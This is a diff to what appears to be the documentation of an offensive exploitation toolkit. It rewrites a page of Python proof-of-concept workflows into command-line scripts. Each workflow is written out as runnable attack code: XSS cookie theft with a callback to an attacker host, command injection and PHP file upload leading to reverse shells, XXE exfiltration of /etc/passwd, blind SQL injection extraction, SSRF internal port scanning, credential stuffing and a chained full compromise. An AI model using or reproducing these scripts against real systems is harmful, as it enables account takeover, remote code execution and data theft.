@@ -6,27 +6,38 @@ End-to-end POC workflows for common exploitation scenarios.
 XSS Cookie Stealer
 ------------------
 
-Complete workflow for stealing cookies via XSS:
+Complete workflow for stealing cookies via XSS.
+
+**Setup:**
+
+Start the HTTP callback server first:
+
+.. code-block:: bash
+
+   uv run your_project --server
+
+**Exploit Code:**
 
 .. code-block:: python
 
    import requests
-   from utils.output import out
-   from utils.xss import cookie_stealer
-   from utils.server_hooks import get_cookie
-   from utils.cookie import parse_cookie_string
+   from your_project.utils.output import out
+   from your_project.utils.xss import cookie_stealer
+   from your_project.utils.server_hooks import get_cookie
+   from your_project.utils.cookie import parse_cookie_string
 
-   def exploit_xss(target, lhost, lport=8000):
+   def run(args):
        """Steal admin cookie via stored XSS"""
 
-       # 1. Start server (in separate terminal)
-       #    uv run your_project --server
+       target = args.target
+       lhost = args.lhost
+       lport = args.lport
 
-       # 2. Generate XSS payload
+       # Generate XSS payload
        payload = cookie_stealer(f"http://{lhost}:{lport}")
        out.info(f"Payload: {payload}")
 
-       # 3. Send payload to vulnerable endpoint
+       # Send payload to vulnerable endpoint
        out.status("Injecting XSS payload...")
        r = requests.post(
            f"{target}/comment",
@@ -37,7 +48,7 @@ Complete workflow for stealing cookies via XSS:
        if r.status_code == 302:
            out.success("Payload injected successfully")
 
-       # 4. Wait for admin to visit and trigger callback
+       # Wait for admin to visit and trigger callback
        out.status("Waiting for admin to view comment...")
        cookie_str = get_cookie(timeout=60)
 
@@ -47,10 +58,10 @@ Complete workflow for stealing cookies via XSS:
 
        out.success(f"Cookie captured: {cookie_str}")
 
-       # 5. Parse and use stolen cookie
+       # Parse and use stolen cookie
        cookies = parse_cookie_string(cookie_str)
 
-       # 6. Access admin panel
+       # Access admin panel
        out.status("Accessing admin panel with stolen cookie...")
        r = requests.get(f"{target}/admin", cookies=cookies)
 
@@ -61,23 +72,32 @@ Complete workflow for stealing cookies via XSS:
            out.error("Cookie didn't grant admin access")
            return False
 
-   if __name__ == "__main__":
-       exploit_xss("http://target.local", "10.10.14.5")
+**Run:**
+
+.. code-block:: bash
+
+   uv run your_project --target http://target.local --lhost 10.10.14.5
 
 RCE to Interactive Shell
 -------------------------
 
-From command injection to full PTY shell:
+From command injection to full PTY shell.
+
+**Exploit Code:**
 
 .. code-block:: python
 
    import requests
-   from utils.output import out
-   from utils.reverse_shells import python_oneliner, bash_shell
-   from utils.shell_catcher import auto_shell
+   from your_project.utils.output import out
+   from your_project.utils.reverse_shells import python_oneliner, bash_shell
+   from your_project.utils.shell_catcher import auto_shell
 
-   def exploit_rce(target, lhost, lport=4444):
+   def run(args):
        """Exploit RCE and get interactive shell"""
+
+       target = args.target
+       lhost = args.lhost
+       lport = args.lport
 
        # Generate shell payload
        cmd = python_oneliner(lhost, lport)
@@ -105,24 +125,33 @@ From command injection to full PTY shell:
            else:
                out.error("No shell received")
 
-   if __name__ == "__main__":
-       exploit_rce("http://target.local", "10.10.14.5")
+**Run:**
+
+.. code-block:: bash
+
+   uv run your_project --target http://target.local --lhost 10.10.14.5 --lport 4444
 
 File Upload to RCE
 ------------------
 
-Upload malicious file and get shell:
+Upload malicious file and get shell.
+
+**Exploit Code:**
 
 .. code-block:: python
 
    import requests
-   from utils.output import out
-   from utils.file_upload import FileUploader
-   from utils.reverse_shells import php_shell
-   from utils.shell_catcher import quick_catch
+   from your_project.utils.output import out
+   from your_project.utils.file_upload import FileUploader
+   from your_project.utils.reverse_shells import php_shell
+   from your_project.utils.shell_catcher import quick_catch
 
-   def exploit_upload(target, lhost, lport=4444):
+   def run(args):
        """Upload PHP shell and execute it"""
+
+       target = args.target
+       lhost = args.lhost
+       lport = args.lport
 
        # Generate PHP reverse shell
        shell_path = php_shell(lhost, lport)
@@ -155,32 +184,46 @@ Upload malicious file and get shell:
 
        quick_catch(lport, trigger_func=trigger)
 
-   if __name__ == "__main__":
-       exploit_upload("http://target.local", "10.10.14.5")
+**Run:**
+
+.. code-block:: bash
+
+   uv run your_project --target http://target.local --lhost 10.10.14.5 --lport 4444
 
 XXE Data Exfiltration
 ---------------------
 
-Read files via XXE:
+Read files via XXE.
+
+**Setup:**
+
+Start the HTTP callback server first:
+
+.. code-block:: bash
+
+   uv run your_project --server
+
+**Exploit Code:**
 
 .. code-block:: python
 
    import requests
-   from utils.output import out
-   from utils.xxe import quick_test
-   from utils.server_hooks import get_exfil
+   from your_project.utils.output import out
+   from your_project.utils.xxe import quick_test
+   from your_project.utils.server_hooks import get_exfil
 
-   def exploit_xxe(target, lhost, lport=8000):
+   def run(args):
        """Exfiltrate /etc/passwd via XXE"""
 
-       # 1. Start server (in separate terminal)
-       #    uv run your_project --server
+       target = args.target
+       lhost = args.lhost
+       lport = args.lport
 
-       # 2. Generate XXE payload (also creates DTD file)
+       # Generate XXE payload (also creates DTD file)
        payload = quick_test(f"http://{lhost}:{lport}", "/etc/passwd")
        out.info("XXE payload generated")
 
-       # 3. Send XXE payload
+       # Send XXE payload
        out.status("Sending XXE payload...")
        r = requests.post(
            f"{target}/api/parse",
@@ -188,7 +231,7 @@ Read files via XXE:
            headers={"Content-Type": "application/xml"}
        )
 
-       # 4. Wait for exfil callback
+       # Wait for exfil callback
        out.status("Waiting for data exfiltration...")
        data = get_exfil(timeout=30)
 
@@ -202,23 +245,30 @@ Read files via XXE:
            out.error("No data received")
            return None
 
-   if __name__ == "__main__":
-       exploit_xxe("http://target.local", "10.10.14.5")
+**Run:**
+
+.. code-block:: bash
+
+   uv run your_project --target http://target.local --lhost 10.10.14.5
 
 Blind SQL Injection
 -------------------
 
-Extract data from blind SQLi:
+Extract data from blind SQLi.
+
+**Exploit Code:**
 
 .. code-block:: python
 
    import requests
    import string
-   from utils.output import out
-   from utils.timing import time_request
+   from your_project.utils.output import out
+   from your_project.utils.timing import time_request
 
-   def exploit_sqli_blind(target):
+   def run(args):
        """Extract database name via boolean-based blind SQLi"""
+
+       target = args.target
 
        def check_condition(condition):
            """Returns True if condition is true"""
@@ -251,8 +301,10 @@ Extract data from blind SQLi:
        out.success(f"Database name: {db_name}")
        return db_name
 
-   def exploit_sqli_time(target):
+   def run_time_based(args):
        """Extract data via time-based blind SQLi"""
+
+       target = args.target
 
        def check_char(pos, char):
            """Returns True if char at position matches"""
@@ -284,29 +336,36 @@ Extract data from blind SQLi:
        out.success(f"Database name: {db_name}")
        return db_name
 
-   if __name__ == "__main__":
-       # Boolean-based
-       exploit_sqli_blind("http://target.local")
+**Run:**
 
-       # Time-based
-       exploit_sqli_time("http://target.local")
+.. code-block:: bash
+
+   # Boolean-based
+   uv run your_project --target http://target.local
+
+   # Time-based (if boolean-based doesn't work)
+   uv run your_project --target http://target.local --time-based
 
 SSRF to Internal Access
 ------------------------
 
-Exploit SSRF to access internal services:
+Exploit SSRF to access internal services.
+
+**Exploit Code:**
 
 .. code-block:: python
 
    import requests
-   from utils.output import out
-   from utils.batch_request import batch_request_sync, generate_param_payloads
+   from your_project.utils.output import out
+   from your_project.utils.batch_request import batch_request_sync, generate_param_payloads
    import httpx
 
-   def exploit_ssrf(target):
+   def run(args):
        """Use SSRF to scan internal network"""
 
-       # 1. Test SSRF vulnerability
+       target = args.target
+
+       # Test SSRF vulnerability
        out.info("Testing SSRF...")
        test_url = "http://127.0.0.1:80"
        r = requests.get(f"{target}/fetch", params={"url": test_url})
@@ -317,7 +376,7 @@ Exploit SSRF to access internal services:
            out.error("SSRF test failed")
            return
 
-       # 2. Scan internal ports
+       # Scan internal ports
        out.status("Scanning internal ports...")
        client = httpx.Client()
 
@@ -341,7 +400,7 @@ Exploit SSRF to access internal services:
                port = result.payload['params']['url'].split(':')[-1]
                out.success(f"Port {port} is open")
 
-       # 3. Try to access internal admin panel
+       # Try to access internal admin panel
        out.status("\\nTrying internal admin panel...")
        r = requests.get(
            f"{target}/fetch",
@@ -352,22 +411,29 @@ Exploit SSRF to access internal services:
            out.success("Accessed internal admin panel!")
            out.raw(r.text[:500])
 
-   if __name__ == "__main__":
-       exploit_ssrf("http://target.local")
+**Run:**
+
+.. code-block:: bash
+
+   uv run your_project --target http://target.local
 
 Credential Stuffing
 -------------------
 
-Test multiple credentials efficiently:
+Test multiple credentials efficiently.
+
+**Exploit Code:**
 
 .. code-block:: python
 
    import httpx
-   from utils.output import out
-   from utils.batch_request import batch_request_sync, generate_json_payloads
+   from your_project.utils.output import out
+   from your_project.utils.batch_request import batch_request_sync, generate_json_payloads
 
-   def credential_stuffing(target):
+   def run(args):
        """Test common credential pairs"""
+
+       target = args.target
 
        # Common credentials
        creds = [
@@ -402,28 +468,45 @@ Test multiple credentials efficiently:
                creds = result.payload['json']
                out.success(f"Valid creds: {creds['username']}:{creds['password']}")
 
-   if __name__ == "__main__":
-       credential_stuffing("http://target.local")
+**Run:**
+
+.. code-block:: bash
+
+   uv run your_project --target http://target.local
 
 Complete Exploitation Workflow
 -------------------------------
 
-Full exploitation chain:
+Full exploitation chain.
+
+**Setup:**
+
+Start the HTTP callback server first:
+
+.. code-block:: bash
+
+   uv run your_project --server
+
+**Exploit Code:**
 
 .. code-block:: python
 
    import requests
-   from utils.output import out
-   from utils.html_parser import HTMLParser
-   from utils.xss import cookie_stealer
-   from utils.server_hooks import get_cookie
-   from utils.cookie import parse_cookie_string
-   from utils.file_upload import FileUploader
-   from utils.reverse_shells import php_shell
-   from utils.shell_catcher import auto_shell
+   from your_project.utils.output import out
+   from your_project.utils.html_parser import HTMLParser
+   from your_project.utils.xss import cookie_stealer
+   from your_project.utils.server_hooks import get_cookie
+   from your_project.utils.cookie import parse_cookie_string
+   from your_project.utils.file_upload import FileUploader
+   from your_project.utils.reverse_shells import php_shell
+   from your_project.utils.shell_catcher import auto_shell
 
-   def full_exploit(target, lhost):
+   def run(args):
        """Complete exploitation chain"""
+
+       target = args.target
+       lhost = args.lhost
+       lport = args.lport
 
        # Stage 1: Reconnaissance
        out.info("Stage 1: Reconnaissance")
@@ -447,7 +530,7 @@ Full exploitation chain:
 
        # Stage 2: XSS to steal admin cookie
        out.info("\\nStage 2: XSS Cookie Theft")
-       payload = cookie_stealer(f"http://{lhost}:8000")
+       payload = cookie_stealer(f"http://{lhost}:{lport}")
 
        requests.post(f"{target}/comment", data={"msg": payload})
        out.status("Waiting for admin...")
@@ -491,5 +574,8 @@ Full exploitation chain:
                catcher.stabilize()
                catcher.interact()
 
-   if __name__ == "__main__":
-       full_exploit("http://target.local", "10.10.14.5")
+**Run:**
+
+.. code-block:: bash
+
+   uv run your_project --target http://target.local --lhost 10.10.14.5
